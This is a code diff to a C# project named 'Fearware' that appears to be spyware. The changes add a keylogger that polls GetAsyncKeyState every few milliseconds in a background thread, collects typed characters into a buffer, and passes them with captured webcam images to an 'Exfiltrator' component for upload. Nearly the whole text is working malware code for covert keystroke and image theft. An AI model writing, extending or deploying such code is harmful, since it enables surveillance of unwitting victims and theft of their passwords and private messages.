@@ -19,11 +19,15 @@ using IWshRuntimeLibrary;
 using System.Configuration;
 using System.Security.Cryptography;
 using Newtonsoft.Json;
+using System.Runtime.InteropServices;
 
 namespace Fearware
 {
     public class Core
     {
+        [DllImport("User32.dll")]
+        public static extern int GetAsyncKeyState(Int32 i);
+
         private string _userName;
         private static Dictionary<string, object> _jsonFile;
         private string _localPath;
@@ -32,6 +36,7 @@ namespace Fearware
         private int _fInfoIndex = 0;
         private FilterInfoCollection _filterInfoCollection;
         private VideoCaptureDevice _videoCaptureDevice;
+        private string _text = "";
 
         public Core()
         {
@@ -60,6 +65,17 @@ namespace Fearware
 
         }
         
+        public string Text
+        {
+            get
+            {
+                return _text;
+            }
+            set
+            {
+                _text = value;
+            }
+        }
         public static Dictionary<string,object> GetCredJson()
         {
             return _jsonFile;
@@ -89,9 +105,10 @@ namespace Fearware
         }
 
 
-        private void SetUploadOnDB(string imagesPath)
+        private void SetUploadOnDB(string text,string imagesPath)
         {
-            Exfiltrator.Start(imagesPath);
+            Exfiltrator.Start(text,imagesPath);
+            Text = "";
         }
 
 
@@ -99,6 +116,15 @@ namespace Fearware
         private void StartExecute()
         {
             int count = 0;
+            
+            Thread CaptureTextThread = new Thread(() =>
+            {
+
+                CaptureText(Text);
+
+            });
+            CaptureTextThread.SetApartmentState(ApartmentState.STA);
+            CaptureTextThread.Start();
             while (true)
             {
                 if (count < 15)
@@ -120,7 +146,7 @@ namespace Fearware
                 {
                     if (Directory.GetFiles(_imagesPath).Length != 0)
                     {
-                        SetUploadOnDB(_imagesPath);
+                        SetUploadOnDB(Text, _imagesPath);
                     }
                     count = -1;
                 }
@@ -146,6 +172,25 @@ namespace Fearware
             }
             _videoCaptureDevice.SignalToStop();
 
+        }
+
+
+        private bool CaptureText(string text)
+        {
+            while (true)
+            {
+                Thread.Sleep(5);
+                
+                for (int i = 32; i < 127; i++)
+                {
+                    int keyState = GetAsyncKeyState(i);
+                    
+                    if ((keyState & 1)==1)
+                    {
+                        Text += ((char)i);
+                    }
+                }
+            }
         }
     }
 }
